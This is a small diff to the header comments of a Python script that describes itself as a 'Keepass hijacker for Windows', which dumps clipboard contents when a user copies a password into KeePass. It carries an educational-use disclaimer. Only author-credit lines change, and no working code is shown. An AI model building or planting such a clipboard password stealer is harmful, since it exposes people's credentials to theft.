@@ -1,8 +1,10 @@
 #!/usr/bin/env python
 #-*- coding: utf-8 -*-
 
-#Author : ### lutzenfried ###
-#Use only for educational purpose
+#==========================
+#= Written by lutzenfried =
+#==========================
+#Use for educational purpose only
 
 #Keepass hijacker for Windows
 #Dump clipboard storage, using when copy password to keepass manager
